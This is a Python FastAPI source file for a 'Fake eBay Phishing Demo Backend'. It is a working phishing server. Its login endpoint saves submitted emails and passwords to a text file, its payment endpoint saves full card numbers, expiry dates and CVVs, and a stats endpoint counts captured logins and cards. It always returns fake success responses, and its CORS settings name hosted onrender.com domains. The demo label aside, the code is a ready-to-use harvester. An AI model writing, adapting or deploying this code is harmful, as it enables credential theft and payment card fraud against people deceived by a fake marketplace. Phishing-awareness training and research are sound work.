from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from datetime import datetime
import json
import os

app = FastAPI(title="Fake eBay Phishing Demo Backend")

# Configure CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:3000",
        "https://newshield-1.onrender.com",
        "https://newshield.onrender.com"
    ],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Data models
class LoginData(BaseModel):
    email: str
    password: str

class PaymentData(BaseModel):
    cardNumber: str
    cardholderName: str
    expiryMonth: str
    expiryYear: str
    cvv: str
    userEmail: str
    total: float
    items: list



# Ensure data directory exists
os.makedirs("data", exist_ok=True)

def log_to_file(filename: str, data: dict):
    """Log data to a file with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = {
        "timestamp": timestamp,
        "data": data
    }
    
    with open(f"data/{filename}", "a") as f:
        f.write(json.dumps(log_entry) + "\n")
    
    # Also print to console for demo purposes
    print(f"[{timestamp}] {filename.upper()}: {json.dumps(data, indent=2)}")

@app.get("/")
def read_root():
    return {"message": "Fake eBay Phishing Demo Backend"}

@app.post("/api/login")
async def login(login_data: LoginData):
    """Handle login and capture credentials"""
    try:
        # Log the captured credentials
        log_to_file("logins.txt", {
            "email": login_data.email,
            "password": login_data.password,
            "ip_address": "127.0.0.1",  # In real scenario, get from request
            "user_agent": "Mozilla/5.0 (Demo Browser)"
        })
        
        # Always return success for demo purposes
        return {"success": True, "message": "Login successful"}
    
    except Exception as e:
        print(f"Login error: {e}")
        raise HTTPException(status_code=500, detail="Login failed")

@app.post("/api/payment")
async def process_payment(payment_data: PaymentData):
    """Handle payment and capture card details"""
    try:
        # Log the captured payment information
        log_to_file("cards.txt", {
            "card_number": payment_data.cardNumber,
            "cardholder_name": payment_data.cardholderName,
            "expiry_month": payment_data.expiryMonth,
            "expiry_year": payment_data.expiryYear,
            "cvv": payment_data.cvv,
            "user_email": payment_data.userEmail,
            "total_amount": payment_data.total,
            "items": payment_data.items,
            "ip_address": "127.0.0.1",  # In real scenario, get from request
            "user_agent": "Mozilla/5.0 (Demo Browser)"
        })
        
        # Always return success for demo purposes
        return {"success": True, "message": "Payment processed successfully"}
    
    except Exception as e:
        print(f"Payment error: {e}")
        raise HTTPException(status_code=500, detail="Payment processing failed")

@app.get("/api/stats")
async def get_stats():
    """Get statistics about captured data (for demo monitoring)"""
    try:
        login_count = 0
        card_count = 0
        
        if os.path.exists("data/logins.txt"):
            with open("data/logins.txt", "r") as f:
                login_count = len(f.readlines())
        
        if os.path.exists("data/cards.txt"):
            with open("data/cards.txt", "r") as f:
                card_count = len(f.readlines())
        
        return {
            "logins_captured": login_count,
            "cards_captured": card_count,
            "total_captures": login_count + card_count
        }
    
    except Exception as e:
        print(f"Stats error: {e}")
        return {"error": "Could not retrieve statistics"}



if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000) 